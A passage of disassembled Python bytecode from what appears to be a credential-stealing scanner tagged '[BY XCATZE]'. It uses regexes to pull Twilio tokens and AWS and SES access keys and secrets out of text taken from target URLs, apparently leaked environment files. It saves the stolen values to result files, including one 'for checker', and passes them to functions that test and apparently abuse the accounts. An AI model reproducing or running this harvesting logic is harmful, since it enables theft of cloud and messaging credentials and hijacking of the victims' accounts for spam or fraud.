             2258  CALL_FUNCTION_2       2  ''
             2260  LOAD_CONST               0
             2262  BINARY_SUBSCR    
             2264  STORE_FAST               'acc_key'

 L.1132      2266  SETUP_FINALLY      2286  'to 2286'

 L.1133      2268  LOAD_GLOBAL              reg
             2270  LOAD_STR                 '\nTwilio_Number=(.*?)\n'
             2272  LOAD_FAST                'text'
             2274  CALL_FUNCTION_2       2  ''
             2276  LOAD_CONST               0
             2278  BINARY_SUBSCR    
             2280  STORE_FAST               'acc_from'
             2282  POP_BLOCK        
             2284  JUMP_FORWARD       2302  'to 2302'
           2286_0  COME_FROM_FINALLY  2266  '2266'

 L.1134      2286  POP_TOP          
             2288  POP_TOP          
             2290  POP_TOP          

 L.1135      2292  LOAD_STR                 ''
             2294  STORE_FAST               'acc_from'
             2296  POP_EXCEPT       
             2298  JUMP_FORWARD       2302  'to 2302'
             2300  END_FINALLY      
           2302_0  COME_FROM          2298  '2298'
           2302_1  COME_FROM          2284  '2284'

 L.1136      2302  LOAD_STR                 'URL: '
             2304  LOAD_GLOBAL              str
             2306  LOAD_FAST                'url'
             2308  CALL_FUNCTION_1       1  ''
             2310  BINARY_ADD       
             2312  LOAD_STR                 '\nTWILIO_SID: '
             2314  BINARY_ADD       
             2316  LOAD_GLOBAL              str
             2318  LOAD_FAST                'acc_sid'
             2320  CALL_FUNCTION_1       1  ''
             2322  BINARY_ADD       
             2324  LOAD_STR                 '\nTWILIO_TOKEN: '
             2326  BINARY_ADD       
             2328  LOAD_GLOBAL              str
             2330  LOAD_FAST                'acc_key'
             2332  CALL_FUNCTION_1       1  ''
             2334  BINARY_ADD       
             2336  LOAD_STR                 '\nTWILIO_FROM: '
             2338  BINARY_ADD       
             2340  LOAD_GLOBAL              str
             2342  LOAD_FAST                'acc_from'
             2344  CALL_FUNCTION_1       1  ''
             2346  BINARY_ADD       
             2348  STORE_FAST               'build'

 L.1137      2350  LOAD_GLOBAL              str
             2352  LOAD_FAST                'build'
             2354  CALL_FUNCTION_1       1  ''
             2356  LOAD_METHOD              replace
             2358  LOAD_STR                 '\r'
             2360  LOAD_STR                 ''
             2362  CALL_METHOD_2         2  ''
             2364  STORE_FAST               'remover'

 L.1138      2366  LOAD_GLOBAL              open
             2368  LOAD_STR                 'result/twillio.txt'
             2370  LOAD_STR                 'a'
             2372  CALL_FUNCTION_2       2  ''
             2374  STORE_FAST               'save'

 L.1139      2376  LOAD_FAST                'save'
             2378  LOAD_METHOD              write
             2380  LOAD_FAST                'remover'
             2382  LOAD_STR                 '\n\n'
             2384  BINARY_ADD       
             2386  CALL_METHOD_1         1  ''
             2388  POP_TOP          

 L.1140      2390  LOAD_FAST                'save'
             2392  LOAD_METHOD              close
             2394  CALL_METHOD_0         0  ''
             2396  POP_TOP          

 L.1141      2398  SETUP_FINALLY      2418  'to 2418'

 L.1142      2400  LOAD_GLOBAL              twilliocheck
             2402  LOAD_FAST                'url'
             2404  LOAD_FAST                'acc_sid'
             2406  LOAD_FAST                'auhtoken'
             2408  LOAD_FAST                'phone'
             2410  CALL_FUNCTION_4       4  ''
             2412  POP_TOP          
           2414_0  COME_FROM          1954  '1954'
             2414  POP_BLOCK        
             2416  JUMP_FORWARD       2444  'to 2444'
           2418_0  COME_FROM_FINALLY  2398  '2398'

 L.1143      2418  POP_TOP          
             2420  POP_TOP          
             2422  POP_TOP          

 L.1144      2424  LOAD_GLOBAL              print
             2426  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mInvalid Twillio\n'
             2428  LOAD_METHOD              format
             2430  LOAD_FAST                'url'
             2432  CALL_METHOD_1         1  ''
             2434  CALL_FUNCTION_1       1  ''
             2436  POP_TOP          
           2438_0  COME_FROM          1978  '1978'
             2438  POP_EXCEPT       
             2440  JUMP_FORWARD       2444  'to 2444'
             2442  END_FINALLY      
           2444_0  COME_FROM          2440  '2440'
           2444_1  COME_FROM          2416  '2416'
           2444_2  COME_FROM          2234  '2234'
           2444_3  COME_FROM          2222  '2222'
           2444_4  COME_FROM          2214  '2214'
           2444_5  COME_FROM          1982  '1982'

 L.1148      2444  LOAD_STR                 'AWS_ACCESS_KEY_ID='
             2446  LOAD_FAST                'text'
             2448  COMPARE_OP               in
         2450_2452  POP_JUMP_IF_FALSE  2808  'to 2808'
             2454  LOAD_GLOBAL              AWS_ACCESS_KEY
             2456  CALL_FUNCTION_0       0  ''
             2458  LOAD_STR                 'on'
             2460  COMPARE_OP               ==
         2462_2464  POP_JUMP_IF_FALSE  2808  'to 2808'

 L.1149      2466  LOAD_GLOBAL              reg
             2468  LOAD_STR                 '\nAWS_ACCESS_KEY_ID=(.*?)\n'
             2470  LOAD_FAST                'text'
             2472  CALL_FUNCTION_2       2  ''
             2474  LOAD_CONST               0
             2476  BINARY_SUBSCR    
             2478  STORE_FAST               'mailhost'

 L.1150      2480  LOAD_GLOBAL              reg
             2482  LOAD_STR                 '\nAWS_SECRET_ACCESS_KEY=(.*?)\n'
             2484  LOAD_FAST                'text'
             2486  CALL_FUNCTION_2       2  ''
             2488  LOAD_CONST               0
             2490  BINARY_SUBSCR    
             2492  STORE_FAST               'mailport'

 L.1151      2494  LOAD_GLOBAL              reg
             2496  LOAD_STR                 '\nAWS_DEFAULT_REGION=(.*?)\n'
             2498  LOAD_FAST                'text'
             2500  CALL_FUNCTION_2       2  ''
             2502  LOAD_CONST               0
             2504  BINARY_SUBSCR    
             2506  STORE_FAST               'mailuser'

 L.1152      2508  LOAD_STR                 'URL: '
             2510  LOAD_GLOBAL              str
             2512  LOAD_FAST                'url'
             2514  CALL_FUNCTION_1       1  ''
             2516  BINARY_ADD       
             2518  LOAD_STR                 '\nAWS_ACCESS_KEY_ID: '
             2520  BINARY_ADD       
             2522  LOAD_GLOBAL              str
             2524  LOAD_FAST                'mailhost'
             2526  CALL_FUNCTION_1       1  ''
             2528  BINARY_ADD       
             2530  LOAD_STR                 '\nAWS_SECRET_ACCESS_KEY: '
             2532  BINARY_ADD       
             2534  LOAD_GLOBAL              str
             2536  LOAD_FAST                'mailport'
             2538  CALL_FUNCTION_1       1  ''
             2540  BINARY_ADD       
             2542  LOAD_STR                 '\nAWS_DEFAULT_REGION: '
             2544  BINARY_ADD       
             2546  LOAD_GLOBAL              str
             2548  LOAD_FAST                'mailuser'
             2550  CALL_FUNCTION_1       1  ''
             2552  BINARY_ADD       
             2554  STORE_FAST               'build'

 L.1153      2556  LOAD_GLOBAL              str
             2558  LOAD_FAST                'mailhost'
             2560  CALL_FUNCTION_1       1  ''
             2562  LOAD_STR                 '|'
             2564  BINARY_ADD       
             2566  LOAD_GLOBAL              str
             2568  LOAD_FAST                'mailport'
             2570  CALL_FUNCTION_1       1  ''
             2572  BINARY_ADD       
             2574  LOAD_STR                 '|'
             2576  BINARY_ADD       
             2578  LOAD_GLOBAL              str
             2580  LOAD_FAST                'mailuser'
             2582  CALL_FUNCTION_1       1  ''
             2584  BINARY_ADD       
             2586  STORE_FAST               'build2'

 L.1154      2588  LOAD_GLOBAL              str
             2590  LOAD_FAST                'build'
             2592  CALL_FUNCTION_1       1  ''
             2594  LOAD_METHOD              replace
             2596  LOAD_STR                 '\r'
             2598  LOAD_STR                 ''
             2600  CALL_METHOD_2         2  ''
             2602  STORE_FAST               'remover'

 L.1155      2604  LOAD_GLOBAL              str
             2606  LOAD_FAST                'mailuser'
             2608  CALL_FUNCTION_1       1  ''
             2610  LOAD_STR                 ''
             2612  COMPARE_OP               !=
         2614_2616  POP_JUMP_IF_FALSE  3850  'to 3850'
             2618  LOAD_GLOBAL              str
             2620  LOAD_FAST                'mailport'
             2622  CALL_FUNCTION_1       1  ''
             2624  LOAD_STR                 ''
             2626  COMPARE_OP               !=
         2628_2630  POP_JUMP_IF_FALSE  3850  'to 3850'

 L.1156      2632  LOAD_GLOBAL              print
             2634  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mAWS_ACCESS_KEY\n'
             2636  LOAD_METHOD              format
             2638  LOAD_GLOBAL              str
             2640  LOAD_FAST                'url'
             2642  CALL_FUNCTION_1       1  ''
             2644  CALL_METHOD_1         1  ''
             2646  CALL_FUNCTION_1       1  ''
             2648  POP_TOP          

 L.1157      2650  LOAD_GLOBAL              open
             2652  LOAD_STR                 'result/'
             2654  LOAD_FAST                'mailuser'
             2656  BINARY_ADD       
             2658  LOAD_STR                 '.txt'
             2660  BINARY_ADD       
             2662  LOAD_STR                 'a'
             2664  CALL_FUNCTION_2       2  ''
             2666  STORE_FAST               'save'

 L.1158      2668  LOAD_FAST                'save'
             2670  LOAD_METHOD              write
             2672  LOAD_FAST                'remover'
             2674  LOAD_STR                 '\n\n'
             2676  BINARY_ADD       
             2678  CALL_METHOD_1         1  ''
             2680  POP_TOP          

 L.1159      2682  LOAD_FAST                'save'
             2684  LOAD_METHOD              close
             2686  CALL_METHOD_0         0  ''
             2688  POP_TOP          

 L.1160      2690  LOAD_GLOBAL              open
             2692  LOAD_STR                 'result/aws_secret_key.txt'
             2694  LOAD_STR                 'a'
             2696  CALL_FUNCTION_2       2  ''
             2698  STORE_FAST               'save2'

 L.1161      2700  LOAD_FAST                'save2'
             2702  LOAD_METHOD              write
             2704  LOAD_FAST                'remover'
             2706  LOAD_STR                 '\n\n'
             2708  BINARY_ADD       
             2710  CALL_METHOD_1         1  ''
             2712  POP_TOP          

 L.1162      2714  LOAD_FAST                'save2'
             2716  LOAD_METHOD              close
             2718  CALL_METHOD_0         0  ''
             2720  POP_TOP          

 L.1163      2722  LOAD_GLOBAL              open
             2724  LOAD_STR                 'result/aws_secret_key_for_checker.txt'
             2726  LOAD_STR                 'a'
             2728  CALL_FUNCTION_2       2  ''
             2730  STORE_FAST               'save3'

 L.1164      2732  LOAD_FAST                'save3'
             2734  LOAD_METHOD              write
             2736  LOAD_FAST                'build2'
             2738  LOAD_STR                 '\n'
             2740  BINARY_ADD       
             2742  CALL_METHOD_1         1  ''
             2744  POP_TOP          

 L.1165      2746  LOAD_FAST                'save3'
             2748  LOAD_METHOD              close
             2750  CALL_METHOD_0         0  ''
             2752  POP_TOP          

 L.1166      2754  SETUP_FINALLY      2774  'to 2774'

 L.1167      2756  LOAD_GLOBAL              autocreateses
             2758  LOAD_FAST                'url'
             2760  LOAD_FAST                'mailhost'
             2762  LOAD_FAST                'mailport'
             2764  LOAD_FAST                'mailuser'
             2766  CALL_FUNCTION_4       4  ''
             2768  POP_TOP          
             2770  POP_BLOCK        
             2772  JUMP_FORWARD       3850  'to 3850'
           2774_0  COME_FROM_FINALLY  2754  '2754'

 L.1168      2774  POP_TOP          
             2776  POP_TOP          
             2778  POP_TOP          

 L.1169      2780  LOAD_GLOBAL              print
             2782  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mCANT CRACK AWS KEY\n'
             2784  LOAD_METHOD              format
             2786  LOAD_GLOBAL              str
             2788  LOAD_FAST                'url'
             2790  CALL_FUNCTION_1       1  ''
             2792  CALL_METHOD_1         1  ''
             2794  CALL_FUNCTION_1       1  ''
             2796  POP_TOP          
             2798  POP_EXCEPT       
             2800  JUMP_FORWARD       3850  'to 3850'
             2802  END_FINALLY      
         2804_2806  JUMP_FORWARD       3850  'to 3850'
           2808_0  COME_FROM          2462  '2462'
           2808_1  COME_FROM          2450  '2450'

 L.1170      2808  LOAD_STR                 'AWS_KEY='
             2810  LOAD_FAST                'text'
             2812  COMPARE_OP               in
         2814_2816  POP_JUMP_IF_FALSE  3172  'to 3172'
             2818  LOAD_GLOBAL              AWS_KEY
             2820  CALL_FUNCTION_0       0  ''
             2822  LOAD_STR                 'on'
             2824  COMPARE_OP               ==
         2826_2828  POP_JUMP_IF_FALSE  3172  'to 3172'

 L.1171      2830  LOAD_GLOBAL              reg
             2832  LOAD_STR                 '\nAWS_KEY=(.*?)\n'
             2834  LOAD_FAST                'text'
             2836  CALL_FUNCTION_2       2  ''
             2838  LOAD_CONST               0
             2840  BINARY_SUBSCR    
             2842  STORE_FAST               'mailhost'

 L.1172      2844  LOAD_GLOBAL              reg
             2846  LOAD_STR                 '\nAWS_SECRET=(.*?)\n'
             2848  LOAD_FAST                'text'
             2850  CALL_FUNCTION_2       2  ''
             2852  LOAD_CONST               0
             2854  BINARY_SUBSCR    
             2856  STORE_FAST               'mailport'

 L.1173      2858  LOAD_GLOBAL              reg
             2860  LOAD_STR                 '\nAWS_REGION=(.*?)\n'
             2862  LOAD_FAST                'text'
             2864  CALL_FUNCTION_2       2  ''
             2866  LOAD_CONST               0
             2868  BINARY_SUBSCR    
             2870  STORE_FAST               'mailuser'

 L.1174      2872  LOAD_STR                 'URL: '
             2874  LOAD_GLOBAL              str
             2876  LOAD_FAST                'url'
             2878  CALL_FUNCTION_1       1  ''
             2880  BINARY_ADD       
             2882  LOAD_STR                 '\nAWS_ACCESS_KEY_ID: '
             2884  BINARY_ADD       
             2886  LOAD_GLOBAL              str
             2888  LOAD_FAST                'mailhost'
             2890  CALL_FUNCTION_1       1  ''
             2892  BINARY_ADD       
             2894  LOAD_STR                 '\nAWS_SECRET_ACCESS_KEY: '
             2896  BINARY_ADD       
             2898  LOAD_GLOBAL              str
             2900  LOAD_FAST                'mailport'
             2902  CALL_FUNCTION_1       1  ''
             2904  BINARY_ADD       
             2906  LOAD_STR                 '\nAWS_DEFAULT_REGION: '
             2908  BINARY_ADD       
             2910  LOAD_GLOBAL              str
             2912  LOAD_FAST                'mailuser'
             2914  CALL_FUNCTION_1       1  ''
             2916  BINARY_ADD       
             2918  STORE_FAST               'build'

 L.1175      2920  LOAD_GLOBAL              str
             2922  LOAD_FAST                'build'
             2924  CALL_FUNCTION_1       1  ''
             2926  LOAD_METHOD              replace
             2928  LOAD_STR                 '\r'
             2930  LOAD_STR                 ''
             2932  CALL_METHOD_2         2  ''
             2934  STORE_FAST               'remover'

 L.1176      2936  LOAD_GLOBAL              str
             2938  LOAD_FAST                'mailhost'
             2940  CALL_FUNCTION_1       1  ''
             2942  LOAD_STR                 '|'
             2944  BINARY_ADD       
             2946  LOAD_GLOBAL              str
             2948  LOAD_FAST                'mailport'
             2950  CALL_FUNCTION_1       1  ''
             2952  BINARY_ADD       
             2954  LOAD_STR                 '|'
             2956  BINARY_ADD       
             2958  LOAD_GLOBAL              str
             2960  LOAD_FAST                'mailuser'
             2962  CALL_FUNCTION_1       1  ''
             2964  BINARY_ADD       
             2966  STORE_FAST               'build2'

 L.1177      2968  LOAD_GLOBAL              str
             2970  LOAD_FAST                'mailuser'
             2972  CALL_FUNCTION_1       1  ''
             2974  LOAD_STR                 ''
             2976  COMPARE_OP               !=
         2978_2980  POP_JUMP_IF_FALSE  3850  'to 3850'
             2982  LOAD_GLOBAL              str
             2984  LOAD_FAST                'mailport'
             2986  CALL_FUNCTION_1       1  ''
             2988  LOAD_STR                 ''
             2990  COMPARE_OP               !=
         2992_2994  POP_JUMP_IF_FALSE  3850  'to 3850'

 L.1178      2996  LOAD_GLOBAL              print
             2998  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mAWS_ACCESS_KEY\n'
             3000  LOAD_METHOD              format
             3002  LOAD_GLOBAL              str
             3004  LOAD_FAST                'url'
             3006  CALL_FUNCTION_1       1  ''
             3008  CALL_METHOD_1         1  ''
             3010  CALL_FUNCTION_1       1  ''
             3012  POP_TOP          

 L.1179      3014  LOAD_GLOBAL              open
             3016  LOAD_STR                 'result/'
             3018  LOAD_FAST                'mailuser'
             3020  BINARY_ADD       
             3022  LOAD_STR                 '.txt'
             3024  BINARY_ADD       
             3026  LOAD_STR                 'a'
             3028  CALL_FUNCTION_2       2  ''
             3030  STORE_FAST               'save'

 L.1180      3032  LOAD_FAST                'save'
             3034  LOAD_METHOD              write
             3036  LOAD_FAST                'remover'
             3038  LOAD_STR                 '\n\n'
             3040  BINARY_ADD       
             3042  CALL_METHOD_1         1  ''
             3044  POP_TOP          

 L.1181      3046  LOAD_FAST                'save'
             3048  LOAD_METHOD              close
             3050  CALL_METHOD_0         0  ''
             3052  POP_TOP          

 L.1182      3054  LOAD_GLOBAL              open
             3056  LOAD_STR                 'result/aws_secret_key.txt'
             3058  LOAD_STR                 'a'
             3060  CALL_FUNCTION_2       2  ''
             3062  STORE_FAST               'save2'

 L.1183      3064  LOAD_FAST                'save2'
             3066  LOAD_METHOD              write
             3068  LOAD_FAST                'remover'
             3070  LOAD_STR                 '\n\n'
             3072  BINARY_ADD       
             3074  CALL_METHOD_1         1  ''
             3076  POP_TOP          

 L.1184      3078  LOAD_FAST                'save2'
             3080  LOAD_METHOD              close
             3082  CALL_METHOD_0         0  ''
             3084  POP_TOP          

 L.1185      3086  LOAD_GLOBAL              open
             3088  LOAD_STR                 'result/aws_secret_key_for_checker.txt'
             3090  LOAD_STR                 'a'
             3092  CALL_FUNCTION_2       2  ''
             3094  STORE_FAST               'save3'

 L.1186      3096  LOAD_FAST                'save3'
             3098  LOAD_METHOD              write
             3100  LOAD_FAST                'build2'
             3102  LOAD_STR                 '\n\n'
             3104  BINARY_ADD       
             3106  CALL_METHOD_1         1  ''
             3108  POP_TOP          

 L.1187      3110  LOAD_FAST                'save3'
             3112  LOAD_METHOD              close
             3114  CALL_METHOD_0         0  ''
             3116  POP_TOP          

 L.1188      3118  SETUP_FINALLY      3138  'to 3138'

 L.1189      3120  LOAD_GLOBAL              autocreateses
             3122  LOAD_FAST                'url'
             3124  LOAD_FAST                'mailhost'
             3126  LOAD_FAST                'mailport'
             3128  LOAD_FAST                'mailuser'
             3130  CALL_FUNCTION_4       4  ''
             3132  POP_TOP          
             3134  POP_BLOCK        
             3136  JUMP_FORWARD       3850  'to 3850'
           3138_0  COME_FROM_FINALLY  3118  '3118'

 L.1190      3138  POP_TOP          
             3140  POP_TOP          
             3142  POP_TOP          

 L.1191      3144  LOAD_GLOBAL              print
             3146  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mCANT CRACK AWS KEY\n'
             3148  LOAD_METHOD              format
             3150  LOAD_GLOBAL              str
             3152  LOAD_FAST                'url'
             3154  CALL_FUNCTION_1       1  ''
             3156  CALL_METHOD_1         1  ''
             3158  CALL_FUNCTION_1       1  ''
             3160  POP_TOP          
             3162  POP_EXCEPT       
             3164  JUMP_FORWARD       3850  'to 3850'
             3166  END_FINALLY      
         3168_3170  JUMP_FORWARD       3850  'to 3850'
           3172_0  COME_FROM          2826  '2826'
           3172_1  COME_FROM          2814  '2814'

 L.1192      3172  LOAD_STR                 'AWSAPP_KEY='
             3174  LOAD_FAST                'text'
             3176  COMPARE_OP               in
         3178_3180  POP_JUMP_IF_FALSE  3536  'to 3536'
             3182  LOAD_GLOBAL              AWS_KEY
             3184  CALL_FUNCTION_0       0  ''
             3186  LOAD_STR                 'on'
             3188  COMPARE_OP               ==
         3190_3192  POP_JUMP_IF_FALSE  3536  'to 3536'

 L.1193      3194  LOAD_GLOBAL              reg
             3196  LOAD_STR                 '\nAWSAPP_KEY=(.*?)\n'
             3198  LOAD_FAST                'text'
             3200  CALL_FUNCTION_2       2  ''
             3202  LOAD_CONST               0
             3204  BINARY_SUBSCR    
             3206  STORE_FAST               'mailhost'

 L.1194      3208  LOAD_GLOBAL              reg
             3210  LOAD_STR                 '\nAWSAPP_SECRET=(.*?)\n'
             3212  LOAD_FAST                'text'
             3214  CALL_FUNCTION_2       2  ''
             3216  LOAD_CONST               0
             3218  BINARY_SUBSCR    
             3220  STORE_FAST               'mailport'

 L.1195      3222  LOAD_GLOBAL              reg
             3224  LOAD_STR                 '\nAWSAPP_REGION=(.*?)\n'
             3226  LOAD_FAST                'text'
             3228  CALL_FUNCTION_2       2  ''
             3230  LOAD_CONST               0
             3232  BINARY_SUBSCR    
             3234  STORE_FAST               'mailuser'

 L.1196      3236  LOAD_STR                 'URL: '
             3238  LOAD_GLOBAL              str
             3240  LOAD_FAST                'url'
             3242  CALL_FUNCTION_1       1  ''
             3244  BINARY_ADD       
             3246  LOAD_STR                 '\nAWS_ACCESS_KEY_ID: '
             3248  BINARY_ADD       
             3250  LOAD_GLOBAL              str
             3252  LOAD_FAST                'mailhost'
             3254  CALL_FUNCTION_1       1  ''
             3256  BINARY_ADD       
             3258  LOAD_STR                 '\nAWS_SECRET_ACCESS_KEY: '
             3260  BINARY_ADD       
             3262  LOAD_GLOBAL              str
             3264  LOAD_FAST                'mailport'
             3266  CALL_FUNCTION_1       1  ''
             3268  BINARY_ADD       
             3270  LOAD_STR                 '\nAWS_DEFAULT_REGION: '
             3272  BINARY_ADD       
             3274  LOAD_GLOBAL              str
             3276  LOAD_FAST                'mailuser'
             3278  CALL_FUNCTION_1       1  ''
             3280  BINARY_ADD       
             3282  STORE_FAST               'build'

 L.1197      3284  LOAD_GLOBAL              str
             3286  LOAD_FAST                'build'
             3288  CALL_FUNCTION_1       1  ''
             3290  LOAD_METHOD              replace
             3292  LOAD_STR                 '\r'
             3294  LOAD_STR                 ''
             3296  CALL_METHOD_2         2  ''
             3298  STORE_FAST               'remover'

 L.1198      3300  LOAD_GLOBAL              str
             3302  LOAD_FAST                'mailhost'
             3304  CALL_FUNCTION_1       1  ''
             3306  LOAD_STR                 '|'
             3308  BINARY_ADD       
             3310  LOAD_GLOBAL              str
             3312  LOAD_FAST                'mailport'
             3314  CALL_FUNCTION_1       1  ''
             3316  BINARY_ADD       
             3318  LOAD_STR                 '|'
             3320  BINARY_ADD       
             3322  LOAD_GLOBAL              str
             3324  LOAD_FAST                'mailuser'
             3326  CALL_FUNCTION_1       1  ''
             3328  BINARY_ADD       
             3330  STORE_FAST               'build2'

 L.1199      3332  LOAD_GLOBAL              str
             3334  LOAD_FAST                'mailuser'
             3336  CALL_FUNCTION_1       1  ''
             3338  LOAD_STR                 ''
             3340  COMPARE_OP               !=
         3342_3344  POP_JUMP_IF_FALSE  3850  'to 3850'
             3346  LOAD_GLOBAL              str
             3348  LOAD_FAST                'mailport'
             3350  CALL_FUNCTION_1       1  ''
             3352  LOAD_STR                 ''
             3354  COMPARE_OP               !=
         3356_3358  POP_JUMP_IF_FALSE  3850  'to 3850'

 L.1200      3360  LOAD_GLOBAL              print
             3362  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mAWS_ACCESS_KEY\n'
             3364  LOAD_METHOD              format
             3366  LOAD_GLOBAL              str
             3368  LOAD_FAST                'url'
             3370  CALL_FUNCTION_1       1  ''
             3372  CALL_METHOD_1         1  ''
             3374  CALL_FUNCTION_1       1  ''
             3376  POP_TOP          

 L.1201      3378  LOAD_GLOBAL              open
             3380  LOAD_STR                 'result/'
             3382  LOAD_FAST                'mailuser'
             3384  BINARY_ADD       
             3386  LOAD_STR                 '.txt'
             3388  BINARY_ADD       
             3390  LOAD_STR                 'a'
             3392  CALL_FUNCTION_2       2  ''
             3394  STORE_FAST               'save'

 L.1202      3396  LOAD_FAST                'save'
             3398  LOAD_METHOD              write
             3400  LOAD_FAST                'remover'
             3402  LOAD_STR                 '\n\n'
             3404  BINARY_ADD       
             3406  CALL_METHOD_1         1  ''
             3408  POP_TOP          

 L.1203      3410  LOAD_FAST                'save'
             3412  LOAD_METHOD              close
             3414  CALL_METHOD_0         0  ''
             3416  POP_TOP          

 L.1204      3418  LOAD_GLOBAL              open
             3420  LOAD_STR                 'result/aws_secret_key.txt'
             3422  LOAD_STR                 'a'
             3424  CALL_FUNCTION_2       2  ''
             3426  STORE_FAST               'save2'

 L.1205      3428  LOAD_FAST                'save2'
             3430  LOAD_METHOD              write
             3432  LOAD_FAST                'remover'
             3434  LOAD_STR                 '\n\n'
             3436  BINARY_ADD       
             3438  CALL_METHOD_1         1  ''
             3440  POP_TOP          

 L.1206      3442  LOAD_FAST                'save2'
             3444  LOAD_METHOD              close
             3446  CALL_METHOD_0         0  ''
             3448  POP_TOP          

 L.1207      3450  LOAD_GLOBAL              open
             3452  LOAD_STR                 'result/aws_secret_key_for_checker.txt'
             3454  LOAD_STR                 'a'
             3456  CALL_FUNCTION_2       2  ''
             3458  STORE_FAST               'save3'

 L.1208      3460  LOAD_FAST                'save3'
             3462  LOAD_METHOD              write
             3464  LOAD_FAST                'build2'
             3466  LOAD_STR                 '\n\n'
             3468  BINARY_ADD       
             3470  CALL_METHOD_1         1  ''
             3472  POP_TOP          

 L.1209      3474  LOAD_FAST                'save3'
             3476  LOAD_METHOD              close
             3478  CALL_METHOD_0         0  ''
             3480  POP_TOP          

 L.1210      3482  SETUP_FINALLY      3502  'to 3502'

 L.1211      3484  LOAD_GLOBAL              autocreateses
             3486  LOAD_FAST                'url'
             3488  LOAD_FAST                'mailhost'
             3490  LOAD_FAST                'mailport'
             3492  LOAD_FAST                'mailuser'
             3494  CALL_FUNCTION_4       4  ''
             3496  POP_TOP          
             3498  POP_BLOCK        
             3500  JUMP_FORWARD       3850  'to 3850'
           3502_0  COME_FROM_FINALLY  3482  '3482'

 L.1212      3502  POP_TOP          
             3504  POP_TOP          
             3506  POP_TOP          

 L.1213      3508  LOAD_GLOBAL              print
             3510  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mCANT CRACK AWS KEY\n'
             3512  LOAD_METHOD              format
             3514  LOAD_GLOBAL              str
             3516  LOAD_FAST                'url'
             3518  CALL_FUNCTION_1       1  ''
             3520  CALL_METHOD_1         1  ''
             3522  CALL_FUNCTION_1       1  ''
             3524  POP_TOP          
             3526  POP_EXCEPT       
             3528  JUMP_FORWARD       3850  'to 3850'
             3530  END_FINALLY      
         3532_3534  JUMP_FORWARD       3850  'to 3850'
           3536_0  COME_FROM          3190  '3190'
           3536_1  COME_FROM          3178  '3178'

 L.1214      3536  LOAD_STR                 'SES_KEY='
             3538  LOAD_FAST                'text'
             3540  COMPARE_OP               in
         3542_3544  POP_JUMP_IF_FALSE  3850  'to 3850'
             3546  LOAD_GLOBAL              AWS_KEY
             3548  CALL_FUNCTION_0       0  ''
             3550  LOAD_STR                 'on'
             3552  COMPARE_OP               ==
         3554_3556  POP_JUMP_IF_FALSE  3850  'to 3850'

 L.1215      3558  LOAD_GLOBAL              print
             3560  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mAWS_ACCESS_KEY'
             3562  LOAD_METHOD              format
             3564  LOAD_GLOBAL              str
             3566  LOAD_FAST                'url'
             3568  CALL_FUNCTION_1       1  ''
             3570  CALL_METHOD_1         1  ''
             3572  CALL_FUNCTION_1       1  ''
             3574  POP_TOP          

 L.1216      3576  LOAD_GLOBAL              reg
             3578  LOAD_STR                 '\nSES_KEY=(.*?)\n'
             3580  LOAD_FAST                'text'
             3582  CALL_FUNCTION_2       2  ''
             3584  LOAD_CONST               0
             3586  BINARY_SUBSCR    
             3588  STORE_FAST               'mailhost'

 L.1217      3590  LOAD_GLOBAL              reg
             3592  LOAD_STR                 '\nSES_SECRET=(.*?)\n'
             3594  LOAD_FAST                'text'
             3596  CALL_FUNCTION_2       2  ''
             3598  LOAD_CONST               0
             3600  BINARY_SUBSCR    
             3602  STORE_FAST               'mailport'

 L.1218      3604  LOAD_GLOBAL              reg
             3606  LOAD_STR                 '\nSES_REGION=(.*?)\n'
             3608  LOAD_FAST                'text'
             3610  CALL_FUNCTION_2       2  ''
             3612  LOAD_CONST               0
             3614  BINARY_SUBSCR    
             3616  STORE_FAST               'mailuser'

 L.1219      3618  LOAD_STR                 'URL: '
             3620  LOAD_GLOBAL              str
             3622  LOAD_FAST                'url'
             3624  CALL_FUNCTION_1       1  ''
             3626  BINARY_ADD       
             3628  LOAD_STR                 '\nSES_KEY: '
             3630  BINARY_ADD       
             3632  LOAD_GLOBAL              str
             3634  LOAD_FAST                'mailhost'
             3636  CALL_FUNCTION_1       1  ''
             3638  BINARY_ADD       
             3640  LOAD_STR                 '\nSES_SECRET: '
             3642  BINARY_ADD       
             3644  LOAD_GLOBAL              str
             3646  LOAD_FAST                'mailport'
             3648  CALL_FUNCTION_1       1  ''
             3650  BINARY_ADD       
             3652  LOAD_STR                 '\nSES_REGION: '
             3654  BINARY_ADD       
             3656  LOAD_GLOBAL              str
             3658  LOAD_FAST                'mailuser'
             3660  CALL_FUNCTION_1       1  ''
             3662  BINARY_ADD       
             3664  STORE_FAST               'build'

 L.1220      3666  LOAD_GLOBAL              str
             3668  LOAD_FAST                'build'
             3670  CALL_FUNCTION_1       1  ''
             3672  LOAD_METHOD              replace
             3674  LOAD_STR                 '\r'
             3676  LOAD_STR                 ''
             3678  CALL_METHOD_2         2  ''
             3680  STORE_FAST               'remover'

 L.1221      3682  LOAD_GLOBAL              str
             3684  LOAD_FAST                'mailuser'
             3686  CALL_FUNCTION_1       1  ''
             3688  LOAD_STR                 ''
             3690  COMPARE_OP               !=
         3692_3694  POP_JUMP_IF_FALSE  3850  'to 3850'
             3696  LOAD_GLOBAL              str
             3698  LOAD_FAST                'mailport'
             3700  CALL_FUNCTION_1       1  ''
             3702  LOAD_STR                 ''
             3704  COMPARE_OP               !=
         3706_3708  POP_JUMP_IF_FALSE  3850  'to 3850'

 L.1222      3710  LOAD_GLOBAL              print
             3712  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mAWS_ACCESS_KEY\n'
             3714  LOAD_METHOD              format
             3716  LOAD_GLOBAL              str
             3718  LOAD_FAST                'url'
             3720  CALL_FUNCTION_1       1  ''
             3722  CALL_METHOD_1         1  ''
             3724  CALL_FUNCTION_1       1  ''
             3726  POP_TOP          

 L.1223      3728  LOAD_GLOBAL              open
             3730  LOAD_STR                 'result/'
             3732  LOAD_FAST                'mailuser'
             3734  BINARY_ADD       
             3736  LOAD_STR                 '.txt'
             3738  BINARY_ADD       
             3740  LOAD_STR                 'a'
